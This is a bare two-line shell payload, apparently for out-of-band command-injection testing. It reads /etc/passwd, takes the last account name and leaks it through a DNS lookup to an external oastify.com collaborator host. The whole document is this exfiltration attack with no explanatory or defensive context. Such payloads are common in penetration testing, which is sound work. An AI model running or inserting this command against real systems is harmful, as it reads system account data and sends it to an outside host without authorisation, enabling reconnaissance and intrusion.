i=$(cat /etc/passwd | tail -n 1 | cut -d ":" -f 1)
nslookup $i.kl9dtf96irwnwq4bljh5uvm0brhi5atz.oastify.com
